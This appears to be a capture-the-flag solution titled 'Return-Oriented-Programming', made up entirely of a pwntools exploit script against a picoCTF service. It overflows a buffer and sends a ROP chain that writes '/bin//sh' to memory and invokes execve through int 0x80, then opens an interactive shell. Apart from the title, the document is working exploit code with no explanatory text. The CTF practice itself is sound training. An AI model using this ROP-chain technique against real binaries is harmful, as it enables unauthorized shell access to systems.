# Return-Oriented-Programming

# Solve

```py
#!/usr/bin/env python3


# ROPgadget --binary ./vuln --ropchain --badbytes "00|0a"



from pwn import *


with context.quiet:

	
	s =  remote('saturn.picoctf.net',53682)

	#s = process('./vuln')

	# Padding goes here
	p = b''
	p += b'A'*28
	p += p32(0x080583b9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5060) # @ .data
	p += p32(0x41414141) # padding
	p += p32(0x080b073a) # pop eax ; ret
	p += b'/bin'
	p += p32(0x080590f2) # mov dword ptr [edx], eax ; ret
	p += p32(0x080583b9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5064) # @ .data + 4
	p += p32(0x41414141) # padding
	p += p32(0x080b073a) # pop eax ; ret
	p += b'//sh'
	p += p32(0x080590f2) # mov dword ptr [edx], eax ; ret
	p += p32(0x080583b9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5068) # @ .data + 8
	p += p32(0x41414141) # padding
	p += p32(0x0804fb80) # xor eax, eax ; ret
	p += p32(0x080590f2) # mov dword ptr [edx], eax ; ret
	p += p32(0x08049022) # pop ebx ; ret
	p += p32(0x080e5060) # @ .data
	p += p32(0x08049e29) # pop ecx ; ret
	p += p32(0x080e5068) # @ .data + 8
	p += p32(0x080583b9) # pop edx ; pop ebx ; ret
	p += p32(0x080e5068) # @ .data + 8
	p += p32(0x080e5060) # padding without overwrite ebx
	p += p32(0x0804fb80) # xor eax, eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0808054e) # inc eax ; ret
	p += p32(0x0804a3c2) # int 0x80
	
	s.sendline(p)
	s.interactive()
```

